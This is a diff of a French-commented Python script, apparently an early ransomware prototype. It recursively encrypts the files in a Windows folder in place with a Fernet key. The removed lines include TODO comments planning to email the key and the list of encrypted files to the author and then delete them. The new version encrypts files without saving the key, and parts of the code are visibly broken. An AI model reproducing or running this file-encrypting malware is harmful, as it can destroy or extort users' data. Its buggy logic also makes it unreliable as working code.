@@ -1,24 +1,17 @@
 # coding=utf-8
 import os
+import glob
+
 
 #----------------------------------------------------------------------
-# Fonction de création d'une liste des fichiers d'un dossier
+# Fonction de création d'une liste des fichiers et dossier d'un dossier
 # chemins complets
 #----------------------------------------------------------------------
-
 def F_listeFichiers(fichier):
-
-    listeFichier = []
-
-    for (dirpath, dirnames, filenames) in os.walk("C:\Users\Admin\Desktop\Test P1"):
-        listeFichier = [os.path.join(r, file) for r, d, f in os.walk("C:\Users\Admin\Desktop\Test P1") for file in f]
-    nombreFichiers = len(listeFichier)
-    nombreFichiers = str(nombreFichiers)
-
-    print("Il y a " + nombreFichiers + " fichiers dans ce dossier")
-    return (listeFichier)
-
-
+    liste_Chemins = []
+    liste_Chemins = glob.glob(fichier)
+    print(liste_Chemins)
+    return (liste_Chemins)
 #-------------------------
 # Fonction de chiffrement
 #-------------------------
@@ -39,7 +32,7 @@ def F_chiffrement(fichier, fernet_key):
     # ecriture dans le fichier lui même de son contenu chiffré
     with open(fichier, 'wb') as file:
         file.write(encrypted)  # Write the encrypted bytes to the output file
-    return (fichier)
+
 #---------------------------
 # Fonction de déchiffrement
 #---------------------------
@@ -58,9 +51,9 @@ def F_dechiffrement(fichier, fernet_key) :
     # déchiffrement du fichier en entier avec le module fernet
     try:
         decrypted = fernet_key.decrypt(data)
-        print("Valid Key -" + fichier + "Successfully decrypted")
+        print("Valid Key - Successfully decrypted")
     except:
-        print("Invalid Key -" + fichier + " Unsuccessfully decrypted")
+        print("Invalid Key - Unsuccessfully decrypted")
 
     # ecriture dans le fichier lui même de son contenu déchiffré
     with open(fichier, 'wb') as file:
@@ -71,45 +64,54 @@ def F_dechiffrement(fichier, fernet_key) :
 # Boucle principale
 #-----------------------------------------------------------------------------------------------------------
 
+for root, dirs, files in os.walk('C:\Users\Admin\Desktop\Test P1\*', topdown = True):
+    for name in files:
+        print(dirs)
+    for name in dirs:
+        print(files)
+#for dossier in destination:
+#    for root, dirs, files in os.walk(dossier):
+#        for file in files:
+#            chemin_complet = os.path.join(root, file)
+#            encrypt_file(key, chemin_complet)
+
+
 # génération d'une clé de chiffrement avec le module fernet
 from cryptography.fernet import Fernet
 key = Fernet.generate_key()
 fernet_key = Fernet(key)
-
-# enregistrement de la clé dans un fichier_key                       # TODO il reste à m'envoyer ce fichier par mail et à l'effacer ensuite
-fichier_key = open("C:\Users\Admin\Desktop\AnSo\\fichier_key.txt", 'wb')  # Open the file as wb to write bytes
-fichier_key.write(key)
-fichier_key.close()
+# enregistrement de la clé dans un fichier_key
+#fichier_key = open('key.key', 'wb')  # Open the file as wb to write bytes
+#fichier_key.write(key)  # The key is type bytes still
+#fichier_key.close()
 
 # variables
 i = 0
 fichier = 'C:\Users\Admin\Desktop\Test P1\*'
 rang = 0
 liste_Fichiers = []
-nombreFichiers = ' '
-
-liste_Fichiers = F_listeFichiers(fichier)           # je vais chercher la liste des fichiers dans ce dossier
-
-# enregistrement de la liste des fichiers chiffrés dans un fichier_liste # TODO il reste à m'envoyer ce fichier par mail et à l'effacer ensuite
-position = 0
-fichier_liste = open("C:\Users\Admin\Desktop\AnSo\\fichier_liste.txt", 'at')
-for item in (liste_Fichiers):
-    texte = "{} {}"
-    fichier_liste.write(texte.format(position, item)+'\n' )
-    position += 1
-fichier_liste.close()
-
 
 while i == 0:
-    try:
-        fichier = liste_Fichiers[rang]              # pour chaque occurence dans la liste
+    liste_Fichiers = F_listeFichiers(fichier)
+    for fichier in liste_Fichiers:
+        try:
+            fichier = liste_Fichiers[rang]
+        except IndexError:
+            i = 1
+        else:
+            # c'est un fichier ou un dossier ?
+            if os.path.isfile(fichier) == True:
+                F_chiffrement(fichier, fernet_key)
+                rang += 1
+            else:
+                print("C'est un dossier" + fichier)
+                rang += 1
+                if glob.glob(fichier) == ' ':
+                    print("Ce dossier est vide")
+                    #  break
 
-    except IndexError:
-        i = 1                                       # il n'y a plus de fichier dans ce dossier
-        break
-    else:
-        F_chiffrement(fichier, fernet_key)          # si oui je le chiffre
-        rang += 1                                   # je passe au fichier suivant
+
+    i = 1
 
 #-----------------------------
 # Pour les tests je décrypte
@@ -120,7 +122,7 @@ reponse = " "
 fichier = 'C:\Users\Admin\Desktop\Test P1\*'
 
 while j == 0:
-    reponse = raw_input('Voulez-vous déchiffrer le dossier/fichier ? : ')
+    reponse = input('Voulez-vous déchiffrer le dossier/fichier ? : ')
     if reponse in ["Y", "y"]:
         k = 0
         rang = 0
@@ -136,9 +138,7 @@ while j == 0:
                     rang += 1
                 else:
                     fichier = F_listeFichiers(fichier)
-                    rang += 1
-                    #break
-
+                    break
     elif reponse in ["N", "n"]:
         j = 1
         break
@@ -147,3 +147,15 @@ while j == 0:
         pass
 
 
+
+
+# liste des fichiers contenus dans un répertoire
+#import os
+#liste_fichier = os.listdir('c:\Users\Admin\Desktop\Test P1')
+#print(liste_fichier)
+
+
+# est-ce un fichier? taille d’un fichier? supprimer un fichier?
+#os.path.isfile(path)
+#os.path.getsize(path)
+#os.remove(path)
